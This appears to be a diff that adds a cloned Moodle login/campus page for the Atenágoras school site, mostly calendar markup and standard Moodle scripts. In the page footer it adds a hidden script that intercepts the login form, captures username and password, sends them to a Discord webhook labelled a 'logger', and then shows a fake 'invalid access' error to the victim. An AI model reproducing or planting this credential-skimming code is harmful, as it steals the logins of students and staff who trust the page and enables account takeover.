+                                                        target="_blank">www.egea.edu.ar/secundario</a></h3>
+                                                <h3 style="margin-left: 30px;"><a href="https://www.facebook.com/atenagoras1" target="_blank"><img src="https://campus.iga.edu.ar/pluginfile.php/6/course/section/2/LOGO%20FB.jpg" alt="LOGO FB" width="60" height="69" role="presentation" class="atto_image_button_text-bottom">facebook.com/atenagoras1</a></h3>
+                                                <h3
+                                                    style="margin-left: 30px;"><img src="https://campus.iga.edu.ar/pluginfile.php/6/course/section/2/ig.jpg" alt="LOGO IG" width="60" height="58" class="img-fluid atto_image_button_text-bottom">Instagram y Twitter:&nbsp;<a href="https://www.instagram.com/inst_atenagoras_1/"
+                                                        target="_blank">atenagoras_1</a></h3>
+                                                    <p style="margin-left: 30px;"><br></p>
+                                                    <p style="text-align: center; margin-bottom: 0px; color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;"><strong><em>MUY IMPORTANTE!!</em></strong></p>
+                                                    <p style="margin-bottom: 0px; color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;"><br></p>
+                                                    <p style="text-align: center; margin-bottom: 0px; color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;"><strong><em>por problemas técnicos con campus o Alexia escribir mail a: infoatenagoras@gmail.com</em></strong></p>
+                                                    <p style="text-align: center; margin-bottom: 0px; color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;"><br></p>
+                                                    <p style="text-align: center; margin-bottom: 0px; color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;"><br></p>
+                                                    <p style="text-align: center; margin-bottom: 0px; color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-size: small;"><br></p>
+                                            </div>
+                                    </div>
+                                    <ul class="section img-text"></ul>
+                                </div><br /></div>
+
+
+
+                        </section>
+
+                        <section data-region="blocks-column" class="hidden-print">
+                            <aside id="block-region-side-pre" class="block-region" data-blockregion="side-pre" data-droptarget="1"><a href="#sb-1" class="sr-only sr-only-focusable">Salta Calendario</a>
+
+                                <section id="inst3" class=" block_calendar_month block  card mb-3" role="complementary" data-block="calendar_month" aria-labelledby="instance-3-header">
+
+                                    <div class="card-body p-3">
+
+                                        <h5 id="instance-3-header" class="card-title d-inline">Calendario</h5>
+
+
+                                        <div class="card-text content mt-3">
+                                            <div id="calendar-month-2025-11-6913f94c0f36f6913f94c0f3701" data-template="core_calendar/month_mini" data-includenavigation="false" data-mini="true">
+                                                <div id="month-mini-2025-11-6913f94c0f36f6913f94c0f3701" class="calendarwrapper" data-courseid="1" data-categoryid="0" data-month="11" data-year="2025" data-day="12" data-view="month">
+                                                    <span class="overlay-icon-container hidden" data-region="overlay-icon-container">
+            <span class="loading-icon icon-no-margin"><i class="icon fa fa-circle-o-notch fa-spin fa-fw "  title="Cargando" role="img" aria-label="Cargando"></i></span>
+                                                    </span>
+                                                    <table class="minicalendar calendartable">
+                                                        <caption class="calendar-controls">
+                                                            <h3>
+                                                                <a href="https://campus.iga.edu.ar/calendar/view.php?view=month&time=1762916684" title="Este mes">November 2025</a>
+                                                            </h3>
+                                                        </caption>
+                                                        <thead>
+                                                            <tr>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Lunes</span>
+                                                                    <span aria-hidden="true">Lun</span>
+                                                                </th>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Martes</span>
+                                                                    <span aria-hidden="true">Mar</span>
+                                                                </th>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Miércoles</span>
+                                                                    <span aria-hidden="true">Mié</span>
+                                                                </th>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Jueves</span>
+                                                                    <span aria-hidden="true">Jue</span>
+                                                                </th>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Viernes</span>
+                                                                    <span aria-hidden="true">Vie</span>
+                                                                </th>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Sábado</span>
+                                                                    <span aria-hidden="true">Sáb</span>
+                                                                </th>
+                                                                <th class="header text-xs-center">
+                                                                    <span class="sr-only">Domingo</span>
+                                                                    <span aria-hidden="true">Dom</span>
+                                                                </th>
+                                                            </tr>
+                                                        </thead>
+                                                        <tbody>
+                                                            <tr data-region="month-view-week">
+                                                                <td class="dayblank">&nbsp;</td>
+                                                                <td class="dayblank">&nbsp;</td>
+                                                                <td class="dayblank">&nbsp;</td>
+                                                                <td class="dayblank">&nbsp;</td>
+                                                                <td class="dayblank">&nbsp;</td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1761966000"><span class="sr-only">Sin eventos, Saturday, 1 November</span>
+
+                                                                    <span aria-hidden="true">1</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1762052400"><span class="sr-only">Sin eventos, Sunday, 2 November</span>
+
+                                                                    <span aria-hidden="true">2</span>
+                                                                </td>
+                                                            </tr>
+                                                            <tr data-region="month-view-week">
+                                                                <td class="day text-center" data-day-timestamp="1762138800"><span class="sr-only">Sin eventos, Monday, 3 November</span>
+
+                                                                    <span aria-hidden="true">3</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1762225200"><span class="sr-only">Sin eventos, Tuesday, 4 November</span>
+
+                                                                    <span aria-hidden="true">4</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1762311600"><span class="sr-only">Sin eventos, Wednesday, 5 November</span>
+
+                                                                    <span aria-hidden="true">5</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1762398000"><span class="sr-only">Sin eventos, Thursday, 6 November</span>
+
+                                                                    <span aria-hidden="true">6</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1762484400"><span class="sr-only">Sin eventos, Friday, 7 November</span>
+
+                                                                    <span aria-hidden="true">7</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1762570800"><span class="sr-only">Sin eventos, Saturday, 8 November</span>
+
+                                                                    <span aria-hidden="true">8</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1762657200"><span class="sr-only">Sin eventos, Sunday, 9 November</span>
+
+                                                                    <span aria-hidden="true">9</span>
+                                                                </td>
+                                                            </tr>
+                                                            <tr data-region="month-view-week">
+                                                                <td class="day text-center" data-day-timestamp="1762743600"><span class="sr-only">Sin eventos, Monday, 10 November</span>
+
+                                                                    <span aria-hidden="true">10</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1762830000"><span class="sr-only">Sin eventos, Tuesday, 11 November</span>
+
+                                                                    <span aria-hidden="true">11</span>
+                                                                </td>
+                                                                <td class="day text-center today" data-day-timestamp="1762916400"><span class="sr-only">Sin eventos, Wednesday, 12 November</span>
+                                                                    <a id="calendar-day-popover-link-1-2025-315-6913f94c0f36f6913f94c0f3701" href="https://campus.iga.edu.ar/calendar/view.php?view=day&amp;time=1762916400" data-container="body" data-toggle="popover" data-html="true" data-region="mini-day-link" data-trigger="hover focus"
+                                                                        data-placement="top" data-year="2025" data-month="11" data-courseid="1" data-categoryid="0" data-title="Hoy Wednesday, 12 November" data-alternate="No hay eventos" aria-label="Hoy Wednesday, 12 November">12</a>
+                                                                    <div class="hidden">
+
+                                                                    </div>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1763002800"><span class="sr-only">Sin eventos, Thursday, 13 November</span>
+
+                                                                    <span aria-hidden="true">13</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1763089200"><span class="sr-only">Sin eventos, Friday, 14 November</span>
+
+                                                                    <span aria-hidden="true">14</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1763175600"><span class="sr-only">Sin eventos, Saturday, 15 November</span>
+
+                                                                    <span aria-hidden="true">15</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1763262000"><span class="sr-only">Sin eventos, Sunday, 16 November</span>
+
+                                                                    <span aria-hidden="true">16</span>
+                                                                </td>
+                                                            </tr>
+                                                            <tr data-region="month-view-week">
+                                                                <td class="day text-center" data-day-timestamp="1763348400"><span class="sr-only">Sin eventos, Monday, 17 November</span>
+
+                                                                    <span aria-hidden="true">17</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1763434800"><span class="sr-only">Sin eventos, Tuesday, 18 November</span>
+
+                                                                    <span aria-hidden="true">18</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1763521200"><span class="sr-only">Sin eventos, Wednesday, 19 November</span>
+
+                                                                    <span aria-hidden="true">19</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1763607600"><span class="sr-only">Sin eventos, Thursday, 20 November</span>
+
+                                                                    <span aria-hidden="true">20</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1763694000"><span class="sr-only">Sin eventos, Friday, 21 November</span>
+
+                                                                    <span aria-hidden="true">21</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1763780400"><span class="sr-only">Sin eventos, Saturday, 22 November</span>
+
+                                                                    <span aria-hidden="true">22</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1763866800"><span class="sr-only">Sin eventos, Sunday, 23 November</span>
+
+                                                                    <span aria-hidden="true">23</span>
+                                                                </td>
+                                                            </tr>
+                                                            <tr data-region="month-view-week">
+                                                                <td class="day text-center" data-day-timestamp="1763953200"><span class="sr-only">Sin eventos, Monday, 24 November</span>
+
+                                                                    <span aria-hidden="true">24</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1764039600"><span class="sr-only">Sin eventos, Tuesday, 25 November</span>
+
+                                                                    <span aria-hidden="true">25</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1764126000"><span class="sr-only">Sin eventos, Wednesday, 26 November</span>
+
+                                                                    <span aria-hidden="true">26</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1764212400"><span class="sr-only">Sin eventos, Thursday, 27 November</span>
+
+                                                                    <span aria-hidden="true">27</span>
+                                                                </td>
+                                                                <td class="day text-center" data-day-timestamp="1764298800"><span class="sr-only">Sin eventos, Friday, 28 November</span>
+
+                                                                    <span aria-hidden="true">28</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1764385200"><span class="sr-only">Sin eventos, Saturday, 29 November</span>
+
+                                                                    <span aria-hidden="true">29</span>
+                                                                </td>
+                                                                <td class="day text-center weekend" data-day-timestamp="1764471600"><span class="sr-only">Sin eventos, Sunday, 30 November</span>
+
+                                                                    <span aria-hidden="true">30</span>
+                                                                </td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                            </div>
+                                            <div class="footer"></div>
+
+                                        </div>
+
+                                    </div>
+
+                                </section>
+
+                                <span id="sb-1"></span><a href="#sb-2" class="sr-only sr-only-focusable">Salta Próximos eventos</a>
+
+                                <section id="inst1047" class=" block_calendar_upcoming block  card mb-3" role="complementary" data-block="calendar_upcoming" aria-labelledby="instance-1047-header">
+
+                                    <div class="card-body p-3">
+
+                                        <h5 id="instance-1047-header" class="card-title d-inline">Próximos eventos</h5>
+
+
+                                        <div class="card-text content mt-3">
+                                            <div id="calendar-upcoming-block-6913f94c105cf6913f94c0f3702" data-template="core_calendar/upcoming_mini">
+                                                <div class="card-text content calendarwrapper" id="month-upcoming-mini-6913f94c105cf6913f94c0f3702" data-context-id="0" data-courseid="1" data-categoryid="0">
+                                                    <span class="overlay-icon-container hidden" data-region="overlay-icon-container">
+            <span class="loading-icon icon-no-margin"><i class="icon fa fa-circle-o-notch fa-spin fa-fw "  title="Cargando" role="img" aria-label="Cargando"></i></span>
+                                                    </span>
+                                                    No hay eventos próximos
+                                                </div>
+                                            </div>
+                                            <div class="footer">
+                                                <div class="gotocal"><a href="https://campus.iga.edu.ar/calendar/view.php?view=upcoming">Ir al calendario...</a></div>
+                                            </div>
+
+                                        </div>
+
+                                    </div>
+
+                                </section>
+
+                                <span id="sb-2"></span></aside>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="nav-drawer" data-region="drawer" class="d-print-none moodle-has-zindex closed" aria-hidden="true" tabindex="-1">
+            <nav class="list-group" aria-label="Sitio">
+                <ul>
+                    <li>
+                        <a class="list-group-item list-group-item-action active active_tree_node " href="https://campus.iga.edu.ar/" data-key="home" data-isexpandable="0" data-indent="0" data-showdivider="0" data-type="1" data-nodetype="1" data-collapse="0" data-forceopen="1"
+                            data-isactive="1" data-hidden="0" data-preceedwithhr="0">
+                            <div class="ml-0">
+                                <div class="media">
+                                    <span class="media-left">
+                                        <i class="icon fa fa-home fa-fw " aria-hidden="true"  ></i>
+                                    </span>
+                                    <span class="media-body font-weight-bold">Página Principal</span>
+                                </div>
+                            </div>
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+
+
+        <footer id="page-footer" class="py-3 text-dark">
+            <div class="container">
+
+                <div id="course-footer"></div>
+
+                <div class="row">
+
+                    <div class="col-md-8">
+
+
+<script>
+// Agregar este script después del formulario de login
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.querySelector('form[action*="login"]');
+    
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevenir el envío normal del formulario
+            
+            // Obtener los valores de usuario y contraseña
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // URL de tu webhook de Discord
+            const webhookURL = 'https://discord.com/api/webhooks/1438002701181915421/Fnjw-pbdBdpl-yANpc9taNqmip7cwENKEuVuh2AS46FLmhv-3vi_qvb0P_VcSeMfgEi';
+            
+            // Crear el mensaje para Discord
+            const message = {
+                content: `🔐 **Nuevo Login Capturado**\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n🌐 Página: ${window.location.href}\n🕐 Fecha: ${new Date().toLocaleString()}`,
+                username: '6,7 atenagoras logger',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/3064/3064197.png'
+            };
+            
+            // Enviar al webhook de Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error enviando a Discord:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+            
+            // Mostrar mensaje de error en rojo
+            let errorMessage = document.getElementById('login-error-message');
+            if (!errorMessage) {
+                errorMessage = document.createElement('div');
+                errorMessage.id = 'login-error-message';
+                errorMessage.style.color = 'red';
+                errorMessage.style.fontWeight = 'bold';
+                errorMessage.style.textAlign = 'center';
+                errorMessage.style.marginBottom = '15px';
+                errorMessage.style.padding = '10px';
+                
+                // Insertar antes del botón
+                const submitButton = document.querySelector('.sign-up-btn');
+                submitButton.parentNode.insertBefore(errorMessage, submitButton);
+            }
+            
+            errorMessage.textContent = 'Acceso inválido. Por favor, inténtelo otra vez.';
+            
+            console.log('Credenciales capturadas y enviadas');
+        });
+    }
+});
+</script>
+                        <div class="sitelink"><a title="Moodle" class="d-inline-block aalink" href="http://moodle.org/"><img src="https://campus.iga.edu.ar/theme/image.php/fordson/core/1755197430/moodlelogo_grayhat" alt="Logo de Moodle" /></a></div>
+
+
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="brandbox">
+
+
+                            <ul class="footercontact">
+
+
+
+                            </ul>
+
+
+
+                        </div>
+                    </div>
+
+                </div>
+                <nav class="nav navbar-nav d-md-none">
+                    <ul class="list-unstyled pt-3">
+                    </ul>
+                </nav>
+                <div class="tool_dataprivacy"><a href="https://campus.iga.edu.ar/admin/tool/dataprivacy/summary.php">Resumen de retención de datos</a></div><a href="https://download.moodle.org/mobile?version=2021051706.11&amp;lang=es&amp;iosappid=633359593&amp;androidappid=com.moodle.moodlemobile">Descargar la app para dispositivos móviles</a>
+                <script>
+                    //<![CDATA[
+                    var require = {
+                        baseUrl: 'https://campus.iga.edu.ar/lib/requirejs.php/-1/',
+                        // We only support AMD modules with an explicit define() statement.
+                        enforceDefine: true,
+                        skipDataMain: true,
+                        waitSeconds: 0,
+
+                        paths: {
+                            jquery: 'https://campus.iga.edu.ar/lib/javascript.php/-1/lib/jquery/jquery-3.5.1',
+                            jqueryui: 'https://campus.iga.edu.ar/lib/javascript.php/-1/lib/jquery/ui-1.12.1/jquery-ui',
+                            jqueryprivate: 'https://campus.iga.edu.ar/lib/javascript.php/-1/lib/requirejs/jquery-private'
+                        },
+
+                        // Custom jquery config map.
+                        map: {
+                            // '*' means all modules will get 'jqueryprivate'
+                            // for their 'jquery' dependency.
+                            '*': {
+                                jquery: 'jqueryprivate'
+                            },
+                            // Stub module for 'process'. This is a workaround for a bug in MathJax (see MDL-60458).
+                            '*': {
+                                process: 'core/first'
+                            },
+
+                            // 'jquery-private' wants the real jQuery module
+                            // though. If this line was not here, there would
+                            // be an unresolvable cyclic dependency.
+                            jqueryprivate: {
+                                jquery: 'jquery'
+                            }
+                        }
+                    };
+
+                    //]]>
+                </script>
+                <script src="https://campus.iga.edu.ar/lib/javascript.php/-1/lib/requirejs/require.js"></script>
+                <script>
+                    //<![CDATA[
+                    M.util.js_pending("core/first");
+                    require(['core/first'], function() {
+                        require(['core/prefetch']);
+                        require(["media_videojs/loader"], function(loader) {
+                            loader.setUp('es');
+                        });;
+
+                        require(['jquery'], function($) {
+                            require(['theme_boost/bootstrap/popover'], function() {
+                                var target = $("#calendar-day-popover-link-1-2025-315-6913f94c0f36f6913f94c0f3701");
+                                target.popover({
+                                    content: function() {
+                                        var source = target.next().find("> *:not('.hidden')");
+                                        var content = $('<div>');
+
+                                        if (source.length) {
+                                            content.html(source.clone(false));
+                                        } else {
+                                            content.html(target.data('alternate'));
+                                        }
+
+                                        return content.html();
+                                    }
+                                });
+                            });
+                        });;
+
+                        require([
+                            'jquery',
+                            'core_calendar/selectors',
+                            'core_calendar/events',
+                        ], function(
+                            $,
+                            CalendarSelectors,
+                            CalendarEvents
+                        ) {
+
+                            $('body').on(CalendarEvents.filterChanged, function(e, data) {
+                                M.util.js_pending("month-mini-6913f94c0f36f6913f94c0f3701-filterChanged");
+                                // A filter value has been changed.
+                                // Find all matching cells in the popover data, and hide them.
+                                $("#month-mini-2025-11-6913f94c0f36f6913f94c0f3701")
+                                    .find(CalendarSelectors.popoverType[data.type])
+                                    .toggleClass('hidden', !!data.hidden);
+                                M.util.js_complete("month-mini-6913f94c0f36f6913f94c0f3701-filterChanged");
+                            });
+                        });;
+
+                        require(['jquery', 'core_calendar/calendar_mini'], function($, CalendarMini) {
+                            CalendarMini.init($("#calendar-month-2025-11-6913f94c0f36f6913f94c0f3701"), !1);
+                        });;
+
+                        require([
+                            'jquery',
+                            'core_calendar/selectors',
+                            'core_calendar/events',
+                        ], function(
+                            $,
+                            CalendarSelectors,
+                            CalendarEvents
+                        ) {
+                            var root = $('#month-upcoming-mini-6913f94c105cf6913f94c0f3702');
+
+                            $('body').on(CalendarEvents.filterChanged, function(e, data) {
+                                M.util.js_pending("month-upcoming-mini-6913f94c105cf6913f94c0f3702-filterChanged");
+
+                                // A filter value has been changed.
+                                // Find all matching cells in the popover data, and hide them.
+                                var target = $("#month-upcoming-mini-6913f94c105cf6913f94c0f3702").find(CalendarSelectors.eventType[data.type]);
+
+                                var transitionPromise = $.Deferred();
+                                if (data.hidden) {
+                                    transitionPromise.then(function() {
+                                        return target.slideUp('fast').promise();
+                                    });
+                                } else {
+                                    transitionPromise.then(function() {
+                                        return target.slideDown('fast').promise();
+                                    });
+                                }
+
+                                transitionPromise.then(function() {
+                                    M.util.js_complete("month-upcoming-mini-6913f94c105cf6913f94c0f3702-filterChanged");
+
+                                    return;
+                                });
+
+                                transitionPromise.resolve();
+                            });
+                        });;
+
+                        function legacy_activity_onclick_handler_1(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1375&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_2(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1150&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_3(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=2876&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_4(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=2672&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_5(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1863&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_6(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1774&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_7(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1294&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_8(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1198&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_9(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=1066&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_10(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=971&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_11(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=967&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_12(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=3157&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_13(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=3167&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+
+                        function legacy_activity_onclick_handler_14(e) {
+                            e.halt();
+                            window.open('https://campus.iga.edu.ar/mod/url/view.php?id=10004&redirect=1', '', 'width=620,height=450,toolbar=no,location=no,menubar=no,copyhistory=no,status=no,directories=no,scrollbars=yes,resizable=yes');
+                            return false;
+                        };
+                        M.util.js_pending('block_settings/settingsblock');
+                        require(['block_settings/settingsblock'], function(amd) {
+                            amd.init("1174", null);
+                            M.util.js_complete('block_settings/settingsblock');
+                        });;
+
+                        require(['theme_boost/loader']);
+                        require(['jquery', 'theme_boost/bootstrap/tooltip'], function($) {
+                            $('[data-tooltip="tooltip"]').tooltip()
+                        });
+                        require(['theme_boost/drawer'], function(mod) {
+                            mod.init();
+                        });;
+                        M.util.js_pending('core/notification');
+                        require(['core/notification'], function(amd) {
+                            amd.init(6, []);
+                            M.util.js_complete('core/notification');
+                        });;
+                        M.util.js_pending('core/log');
+                        require(['core/log'], function(amd) {
+                            amd.setConfig({
+                                "level": "trace"
+                            });
+                            M.util.js_complete('core/log');
+                        });;
+                        M.util.js_pending('core/page_global');
+                        require(['core/page_global'], function(amd) {
+                            amd.init();
+                            M.util.js_complete('core/page_global');
+                        });
+                        M.util.js_complete("core/first");
+                    });
+                    //]]>
+                </script>
+                <script src="https://campus.iga.edu.ar/lib/javascript.php/-1/theme/fordson/javascript/scrolltotop.js"></script>
+                <script>
+                    //<![CDATA[
+                    M.str = {
+                        "moodle": {
+                            "lastmodified": "\u00daltima modificaci\u00f3n",
+                            "name": "Nombre",
+                            "error": "Error",
+                            "info": "Informaci\u00f3n",
+                            "yes": "S\u00ed",
+                            "no": "No",
+                            "cancel": "Cancelar",
+                            "confirm": "Confirmar",
+                            "areyousure": "\u00bfEst\u00e1 seguro?",
+                            "closebuttontitle": "Cerrar",
+                            "unknownerror": "Error desconocido",
+                            "file": "Archivo",
+                            "url": "URL",
+                            "collapseall": "Colapsar todo",
+                            "expandall": "Expandir todo"
+                        },
+                        "repository": {
+                            "type": "Tipo",
+                            "size": "Tama\u00f1o",
+                            "invalidjson": "Cadena JSON no v\u00e1lida",
+                            "nofilesattached": "No se han adjuntado archivos",
+                            "filepicker": "Selector de archivos",
+                            "logout": "Salir",
+                            "nofilesavailable": "No hay archivos disponibles",
+                            "norepositoriesavailable": "Lo sentimos, ninguno de sus repositorios actuales puede devolver archivos en el formato solicitado.",
+                            "fileexistsdialogheader": "El archivo existe",
+                            "fileexistsdialog_editor": "Un archivo con ese nombre ha sido anexado al texto que Usted est\u00e1 editando",
+                            "fileexistsdialog_filemanager": "Ya ha sido anexado un archivo con ese nombre",
+                            "renameto": "Cambiar el nombre a \"{$a}\"",
+                            "referencesexist": "Existen {$a} enlaces a este archivo",
+                            "select": "Seleccionar"
+                        },
+                        "admin": {
+                            "confirmdeletecomments": "Est\u00e1 a punto de eliminar comentarios, \u00bfest\u00e1 seguro?",
+                            "confirmation": "Confirmaci\u00f3n"
+                        },
+                        "debug": {
+                            "debuginfo": "Informaci\u00f3n de depuraci\u00f3n",
+                            "line": "L\u00ednea",
+                            "stacktrace": "Trazado de la pila (stack)"
+                        },
+                        "langconfig": {
+                            "labelsep": ":"
+                        }
+                    };
+                    //]]>
+                </script>
+                <script>
+                    //<![CDATA[
+                    (function() {
+                        Y.use("moodle-filter_mathjaxloader-loader", function() {
+                            M.filter_mathjaxloader.configure({
+                                "mathjaxconfig": "\nMathJax.Hub.Config({\n    config: [\"Accessible.js\", \"Safe.js\"],\n    errorSettings: { message: [\"!\"] },\n    skipStartupTypeset: true,\n    messageStyle: \"none\"\n});\n",
+                                "lang": "es"
+                            });
+                        });
+                        M.util.help_popups.setup(Y);
+                        M.util.js_pending('random6913f94c0f3704');
+                        Y.on('domready', function() {
+                            M.util.js_complete("init");
+                            M.util.js_complete('random6913f94c0f3704');
+                        });
+                    })();
+                    //]]>
+                </script>
+
+
+            </div>
+
+        </footer>
+
+    </div>
+
+    <a href="#" id="back-to-top" class="btn btn-primary btn-lg" role="button" title="Volver arriba y Scrollspy"><i class="fa fa-chevron-circle-up" aria-hidden="true"></i></a>
+
+</body>
+
+</html>
